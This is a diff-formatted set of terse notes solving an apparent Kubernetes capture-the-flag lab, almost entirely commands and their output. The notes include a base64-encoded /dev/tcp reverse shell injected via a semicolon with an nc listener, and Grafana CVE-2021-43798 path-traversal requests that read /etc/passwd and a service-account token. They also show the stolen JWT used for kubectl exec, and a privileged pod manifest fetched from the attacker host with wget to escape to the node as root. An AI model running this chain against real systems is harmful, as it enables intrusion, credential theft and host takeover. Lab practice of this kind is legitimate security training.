@@ -1,0 +1,182 @@
+https://www.revshells.com/
+#Task 2 RCE 
+;printenv
+
+my machine:
+nc -lnvp 9001
+
+echo "sh -i >& /dev/tcp/10.8.5.174/9001 0>&1" | base64 
+
+;echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuOC41LjE3NC80MjQyIDA+JjE= | base64 -d | bash;
+
+$env
+KUBERNETES_SERVICE_PORT=443
+KUBERNETES_PORT=tcp://10.96.0.1:443
+HOSTNAME=syringe-79b66d66d7-7mxhd
+GRAFANA_PORT_3000_TCP_ADDR=10.108.133.228
+SHLVL=1
+HOME=/home/challenge
+GRAFANA_PORT_3000_TCP_PORT=3000
+GRAFANA_PORT_3000_TCP_PROTO=tcp
+SYRINGE_PORT_3000_TCP_ADDR=10.99.16.179
+SYRINGE_PORT_3000_TCP_PORT=3000
+SYRINGE_PORT_3000_TCP_PROTO=tcp
+GRAFANA_PORT_3000_TCP=tcp://10.108.133.228:3000
+_=pwd
+GRAFANA_SERVICE_HOST=10.108.133.228
+KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1
+PATH=/usr/local/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+KUBERNETES_PORT_443_TCP_PORT=443
+SYRINGE_PORT_3000_TCP=tcp://10.99.16.179:3000
+KUBERNETES_PORT_443_TCP_PROTO=tcp
+GRAFANA_PORT=tcp://10.108.133.228:3000
+SYRINGE_SERVICE_HOST=10.99.16.179
+GRAFANA_SERVICE_PORT=3000
+KUBERNETES_SERVICE_PORT_HTTPS=443
+SYRINGE_PORT=tcp://10.99.16.179:3000
+KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443
+SYRINGE_SERVICE_PORT=3000
+PWD=/home/challenge
+KUBERNETES_SERVICE_HOST=10.96.0.1
+GOLANG_VERSION=1.15.7
+FLAG=flag{5e7cc6165f6c2058b11710a26691bb6b}
+
+
+#Task 3 Interacting with kubernetes 
+
+cd /tmp
+
+#Task 4 Kubernetes Secrets 
+./kubectl get secret secretflag -o 'json'
+{
+    "apiVersion": "v1",
+    "data": {
+        "flag": "ZmxhZ3tkZjJhNjM2ZGUxNTEwOGE0ZGM0MTEzNWQ5MzBkOGVjMX0="
+    },
+    "kind": "Secret",
+    "metadata": {
+        "annotations": {
+            "kubectl.kubernetes.io/last-applied-configuration": "{\"apiVersion\":\"v1\",\"data\":{\"flag\":\"ZmxhZ3tkZjJhNjM2ZGUxNTEwOGE0ZGM0MTEzNWQ5MzBkOGVjMX0=\"},\"kind\":\"Secret\",\"metadata\":{\"annotations\":{},\"name\":\"secretflag\",\"namespace\":\"default\"},\"type\":\"Opaque\"}\n"
+        },
+        "creationTimestamp": "2022-01-06T23:41:19Z",
+        "name": "secretflag",
+        "namespace": "default",
+        "resourceVersion": "562",
+        "uid": "6384b135-4628-4693-b269-4e50bfffdf21"
+    },
+    "type": "Opaque"
+}
+
+
+echo 'ZmxhZ3tkZjJhNjM2ZGUxNTEwOGE0ZGM0MTEzNWQ5MzBkOGVjMX0=' | base64 -d
+flag{df2a636de15108a4dc41135d930d8ec1} 
+
+#Task 5 Recon in the cluster 
+curl http://10.108.133.228:3000/login | grep "version"
+
+google
+grafana 8.3.0-beta2 cve
+CVE-2021-43798
+
+#Task 6 Lateral Movement 
+
+https://golangexample.com/cve-2021-43798-grafana-8-x-path-traversal-pre-auth/
+
+curl --path-as-is http://10.108.133.228:3000/public/plugins/alertlist/../../../../../../../../etc/passwd
+
+curl --path-as-is http://10.108.133.228:3000/public/plugins/alertlist/../../../../../../../../var/run/secrets/kubernetes.io/serviceaccount/token
+
+json decode
+https://jwt.io/
+or 
+https://gchq.github.io/CyberChef/#recipe=JWT_Decode()&input=ZXlKaGJHY2lPaUpTVXpJMU5pSXNJbXRwWkNJNkltODJRVTFXTlY5cU5FSXdZbFYzWW5CR2IxTlhRMjVVZVV0bVZ6TlpaWFpRWmpoUFpVdFViMjFqY2pRaWZRLmV5SmhkV1FpT2xzaWFIUjBjSE02THk5cmRXSmxjbTVsZEdWekxtUmxabUYxYkhRdWMzWmpMbU5zZFhOMFpYSXViRzlqWVd3aVhTd2laWGh3SWpveE5qZzVNelExTnpFMExDSnBZWFFpT2pFMk5UYzRNRGszTVRRc0ltbHpjeUk2SW1oMGRIQnpPaTh2YTNWaVpYSnVaWFJsY3k1a1pXWmhkV3gwTG5OMll5NWpiSFZ6ZEdWeUxteHZZMkZzSWl3aWEzVmlaWEp1WlhSbGN5NXBieUk2ZXlKdVlXMWxjM0JoWTJVaU9pSmtaV1poZFd4MElpd2ljRzlrSWpwN0ltNWhiV1VpT2lKbmNtRm1ZVzVoTFRVM05EVTBZemsxWTJJdGRqUnVjbXNpTENKMWFXUWlPaUptTW1Ka01UY3paUzFpTmpVM0xUUXlOVE10WVRNMk5DMWxOekE1WkRjek1XWmhNVElpZlN3aWMyVnlkbWxqWldGalkyOTFiblFpT25zaWJtRnRaU0k2SW1SbGRtVnNiM0JsY2lJc0luVnBaQ0k2SWpFNU5qZG1Zek13TFRReFlqa3ROREpqWkMxaFpHSTNMV1poWWpaa1lXVXhORGhtTmlKOUxDSjNZWEp1WVdaMFpYSWlPakUyTlRjNE1UTXpNakY5TENKdVltWWlPakUyTlRjNE1EazNNVFFzSW5OMVlpSTZJbk41YzNSbGJUcHpaWEoyYVdObFlXTmpiM1Z1ZERwa1pXWmhkV3gwT21SbGRtVnNiM0JsY2lKOS5VUVh5djR5MTZRb3I3WWVicTRXQ19HaWhqczFQU0FNYjA5b20tZm1yM0o2aDcyaVRvZTQxZXNIN0JPVnVmVnZ0X2lLTmNFa2ZkSXR2aFBMOEIxMUFTNnhvbjUxbzN6QW0taVcwUVV6aURCTUtaY3VYMFp4VFZFYzljb3k3NDFiTGhneFBXS05sZzVwWnpYRlBkVUpTa1ZfR2lVelFrTVlwSzRtSUtFZ245NjhVbXhkcVNUNFdPOUI3T0tiSHR6QXY4RExFZk1kZlN1MDlod3B0Z2VjWlFuY19HSHdNVG5OQVR3eS16UXp2UFp3QW5qQi1WNjVXNVp4cGI1MmJXNVdDS2Vlb1F2WnZUeDJmaElzTjNEQnY2dE9NNXJodjVIZVpFeTNKdGpMOWp5RDRXVXlNX3JCclc4R05GZUphN0lNaDU5amFRRGJEVDBBblpGLVFWcmFPTHc
+
+
+
+./kubectl get pods --token=eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjg5MzQ1NzE0LCJpYXQiOjE2NTc4MDk3MTQsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJncmFmYW5hLTU3NDU0Yzk1Y2ItdjRucmsiLCJ1aWQiOiJmMmJkMTczZS1iNjU3LTQyNTMtYTM2NC1lNzA5ZDczMWZhMTIifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRldmVsb3BlciIsInVpZCI6IjE5NjdmYzMwLTQxYjktNDJjZC1hZGI3LWZhYjZkYWUxNDhmNiJ9LCJ3YXJuYWZ0ZXIiOjE2NTc4MTMzMjF9LCJuYmYiOjE2NTc4MDk3MTQsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRldmVsb3BlciJ9.UQXyv4y16Qor7Yebq4WC_Gihjs1PSAMb09om-fmr3J6h72iToe41esH7BOVufVvt_iKNcEkfdItvhPL8B11AS6xon51o3zAm-iW0QUziDBMKZcuX0ZxTVEc9coy741bLhgxPWKNlg5pZzXFPdUJSkV_GiUzQkMYpK4mIKEgn968UmxdqST4WO9B7OKbHtzAv8DLEfMdfSu09hwptgecZQnc_GHwMTnNATwy-zQzvPZwAnjB-V65W5Zxpb52bW5WCKeeoQvZvTx2fhIsN3DBv6tOM5rhv5HeZEy3JtjL9jyD4WUyM_rBrW8GNFeJa7IMh59jaQDbDT0AnZF-QVraOLw
+NAME                       READY   STATUS    RESTARTS        AGE
+grafana-57454c95cb-v4nrk   1/1     Running   10 (164d ago)   188d
+syringe-79b66d66d7-7mxhd   1/1     Running   1 (164d ago)    164d
+
+
+
+./kubectl exec -it grafana-57454c95cb-v4nrk --token=eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjg5MzQ1NzE0LCJpYXQiOjE2NTc4MDk3MTQsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJncmFmYW5hLTU3NDU0Yzk1Y2ItdjRucmsiLCJ1aWQiOiJmMmJkMTczZS1iNjU3LTQyNTMtYTM2NC1lNzA5ZDczMWZhMTIifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRldmVsb3BlciIsInVpZCI6IjE5NjdmYzMwLTQxYjktNDJjZC1hZGI3LWZhYjZkYWUxNDhmNiJ9LCJ3YXJuYWZ0ZXIiOjE2NTc4MTMzMjF9LCJuYmYiOjE2NTc4MDk3MTQsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRldmVsb3BlciJ9.UQXyv4y16Qor7Yebq4WC_Gihjs1PSAMb09om-fmr3J6h72iToe41esH7BOVufVvt_iKNcEkfdItvhPL8B11AS6xon51o3zAm-iW0QUziDBMKZcuX0ZxTVEc9coy741bLhgxPWKNlg5pZzXFPdUJSkV_GiUzQkMYpK4mIKEgn968UmxdqST4WO9B7OKbHtzAv8DLEfMdfSu09hwptgecZQnc_GHwMTnNATwy-zQzvPZwAnjB-V65W5Zxpb52bW5WCKeeoQvZvTx2fhIsN3DBv6tOM5rhv5HeZEy3JtjL9jyD4WUyM_rBrW8GNFeJa7IMh59jaQDbDT0AnZF-QVraOLw -- /bin/bash
+
+hostname
+grafana-57454c95cb-v4nrk
+env
+KUBERNETES_SERVICE_PORT_HTTPS=443
+GRAFANA_SERVICE_HOST=10.108.133.228
+KUBERNETES_SERVICE_PORT=443
+HOSTNAME=grafana-57454c95cb-v4nrk
+SYRINGE_PORT=tcp://10.99.16.179:3000
+GRAFANA_PORT=tcp://10.108.133.228:3000
+SYRINGE_SERVICE_HOST=10.99.16.179
+SYRINGE_PORT_3000_TCP=tcp://10.99.16.179:3000
+GRAFANA_PORT_3000_TCP=tcp://10.108.133.228:3000
+PWD=/usr/share/grafana
+GF_PATHS_HOME=/usr/share/grafana
+SYRINGE_PORT_3000_TCP_PROTO=tcp
+HOME=/home/grafana
+KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443
+FLAG=flag{288232b2f03b1ec422c5dae50f14061f}
+SHLVL=1
+SYRINGE_PORT_3000_TCP_PORT=3000
+GF_PATHS_PROVISIONING=/etc/grafana/provisioning
+GRAFANA_PORT_3000_TCP_PORT=3000
+KUBERNETES_PORT_443_TCP_PROTO=tcp
+KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1
+GRAFANA_SERVICE_PORT=3000
+SYRINGE_PORT_3000_TCP_ADDR=10.99.16.179
+SYRINGE_SERVICE_PORT=3000
+GF_PATHS_DATA=/var/lib/grafana
+KUBERNETES_SERVICE_HOST=10.96.0.1
+KUBERNETES_PORT=tcp://10.96.0.1:443
+KUBERNETES_PORT_443_TCP_PORT=443
+GF_PATHS_LOGS=/var/log/grafana
+GRAFANA_PORT_3000_TCP_PROTO=tcp
+PATH=/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+GF_PATHS_PLUGINS=/var/lib/grafana/plugins
+GRAFANA_PORT_3000_TCP_ADDR=10.108.133.228
+GF_PATHS_CONFIG=/etc/grafana/grafana.ini
+_=/usr/bin/env
+
+
+#Task 7 Escape to the node 
+
+use https://github.com/BishopFox/badPods/blob/main/manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml
+add the "imagePullPolicy: IfNotPresent" or not condition and encoded it to base64 for easier copy on the server 
+
+
+https://gchq.github.io/CyberChef/#recipe=To_Base64('A-Za-z0-9%2B/%3D')&input=YXBpVmVyc2lvbjogdjEKa2luZDogUG9kCm1ldGFkYXRhOgogIG5hbWU6IGV2ZXJ5dGhpbmctYWxsb3dlZC1leGVjLXBvZAogIGxhYmVsczoKICAgIGFwcDogcGVudGVzdApzcGVjOgogIGhvc3ROZXR3b3JrOiB0cnVlCiAgaG9zdFBJRDogdHJ1ZQogIGhvc3RJUEM6IHRydWUKICBjb250YWluZXJzOgogIC0gbmFtZTogZXZlcnl0aGluZy1hbGxvd2VkLXBvZAogICAgaW1hZ2U6IHVidW50dQogICAgaW1hZ2VQdWxsUG9saWN5OiBJZk5vdFByZXNlbnQKICAgIHNlY3VyaXR5Q29udGV4dDoKICAgICAgcHJpdmlsZWdlZDogdHJ1ZQogICAgdm9sdW1lTW91bnRzOgogICAgLSBtb3VudFBhdGg6IC9ob3N0CiAgICAgIG5hbWU6IG5vZGVyb290CiAgICBjb21tYW5kOiBbICIvYmluL3NoIiwgIi1jIiwgIi0tIiBdCiAgICBhcmdzOiBbICJ3aGlsZSB0cnVlOyBkbyBzbGVlcCAzMDsgZG9uZTsiIF0KICAjbm9kZU5hbWU6IGs4cy1jb250cm9sLXBsYW5lLW5vZGUgIyBGb3JjZSB5b3VyIHBvZCB0byBydW4gb24gdGhlIGNvbnRyb2wtcGxhbmUgbm9kZSBieSB1bmNvbW1lbnRpbmcgdGhpcyBsaW5lIGFuZCBjaGFuZ2luZyB0byBhIGNvbnRyb2wtcGxhbmUgbm9kZSBuYW1lCiAgdm9sdW1lczoKICAtIG5hbWU6IG5vZGVyb290CiAgICBob3N0UGF0aDoKICAgICAgcGF0aDogLw
+
+
+In my machine
+python3 -m http.server 8001
+
+wget http://10.8.5.174:8001/privesc.yml
+
+./kubectl apply -f privesc.yml --token=eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjg5MzQ1NzE0LCJpYXQiOjE2NTc4MDk3MTQsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJncmFmYW5hLTU3NDU0Yzk1Y2ItdjRucmsiLCJ1aWQiOiJmMmJkMTczZS1iNjU3LTQyNTMtYTM2NC1lNzA5ZDczMWZhMTIifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRldmVsb3BlciIsInVpZCI6IjE5NjdmYzMwLTQxYjktNDJjZC1hZGI3LWZhYjZkYWUxNDhmNiJ9LCJ3YXJuYWZ0ZXIiOjE2NTc4MTMzMjF9LCJuYmYiOjE2NTc4MDk3MTQsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRldmVsb3BlciJ9.UQXyv4y16Qor7Yebq4WC_Gihjs1PSAMb09om-fmr3J6h72iToe41esH7BOVufVvt_iKNcEkfdItvhPL8B11AS6xon51o3zAm-iW0QUziDBMKZcuX0ZxTVEc9coy741bLhgxPWKNlg5pZzXFPdUJSkV_GiUzQkMYpK4mIKEgn968UmxdqST4WO9B7OKbHtzAv8DLEfMdfSu09hwptgecZQnc_GHwMTnNATwy-zQzvPZwAnjB-V65W5Zxpb52bW5WCKeeoQvZvTx2fhIsN3DBv6tOM5rhv5HeZEy3JtjL9jyD4WUyM_rBrW8GNFeJa7IMh59jaQDbDT0AnZF-QVraOLw
+pod/everything-allowed-exec-pod created
+
+./kubectl get pods --token=eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjg5MzQ1NzE0LCJpYXQiOjE2NTc4MDk3MTQsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJncmFmYW5hLTU3NDU0Yzk1Y2ItdjRucmsiLCJ1aWQiOiJmMmJkMTczZS1iNjU3LTQyNTMtYTM2NC1lNzA5ZDczMWZhMTIifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRldmVsb3BlciIsInVpZCI6IjE5NjdmYzMwLTQxYjktNDJjZC1hZGI3LWZhYjZkYWUxNDhmNiJ9LCJ3YXJuYWZ0ZXIiOjE2NTc4MTMzMjF9LCJuYmYiOjE2NTc4MDk3MTQsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRldmVsb3BlciJ9.UQXyv4y16Qor7Yebq4WC_Gihjs1PSAMb09om-fmr3J6h72iToe41esH7BOVufVvt_iKNcEkfdItvhPL8B11AS6xon51o3zAm-iW0QUziDBMKZcuX0ZxTVEc9coy741bLhgxPWKNlg5pZzXFPdUJSkV_GiUzQkMYpK4mIKEgn968UmxdqST4WO9B7OKbHtzAv8DLEfMdfSu09hwptgecZQnc_GHwMTnNATwy-zQzvPZwAnjB-V65W5Zxpb52bW5WCKeeoQvZvTx2fhIsN3DBv6tOM5rhv5HeZEy3JtjL9jyD4WUyM_rBrW8GNFeJa7IMh59jaQDbDT0AnZF-QVraOLw
+NAME                          READY   STATUS             RESTARTS        AGE
+everything-allowed-exec-pod   0/1     ImagePullBackOff   0               44s
+grafana-57454c95cb-v4nrk      1/1     Running            10 (164d ago)   188d
+syringe-79b66d66d7-7mxhd      1/1     Running            1 (164d ago)    164d
+
+
+
+
+./kubectl exec -it everything-allowed-exec-pod --token=eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjc3Njc2MjMyLCJpYXQiOjE2NDYxNDAyMzIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJncmFmYW5hLTU3NDU0Yzk1Y2ItdjRucmsiLCJ1aWQiOiJmMmJkMTczZS1iNjU3LTQyNTMtYTM2NC1lNzA5ZDczMWZhMTIifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRldmVsb3BlciIsInVpZCI6IjE5NjdmYzMwLTQxYjktNDJjZC1hZGI3LWZhYjZkYWUxNDhmNiJ9LCJ3YXJuYWZ0ZXIiOjE2NDYxNDM4Mzl9LCJuYmYiOjE2NDYxNDAyMzIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRldmVsb3BlciJ9.DPFmKXMd4Cp_FQR8iNKNjZ8V1lz2FgyA08eJ5jj_eD-WvlAEhXYU3wNuoPNsJiB8SwBB0XNNV-qLPdVVssoI6u7QyaIgJmcb4KEFAqK_f3WGx8UX01Bwb5IW5i-JGlGWOu1BV6ZkbmPeTtnj7nBLnxNK6zuuAXUtmSv4MlwKxb5AbbfSWkwLqVoZKezTdQkTb3ZI4MEgX6sGUSpmh0OZWD7gi3zvuW0Cox-FSUOxcMSRSjFnIWs5Wgt2ZDa9AtS2WVg7qakG9pgAxXYYp-bhIRVW1QGoMp5R1ldujaJGL90jl548Z6z-GxRFxAy_NjP06NHLpPH1WKqjfNzHwfhk7w -- /bin/bash
+Unable to use a TTY - input is not a terminal or the right kind of file
+hostname
+minikube
+whoami
+root
+find / -type f -name root.txt 2>/dev/null
+/host/root/root.txt
+cat /host/root/root.txt
+flag{30180a273e7da821a7fe4af22ffd1701}
+
+theend
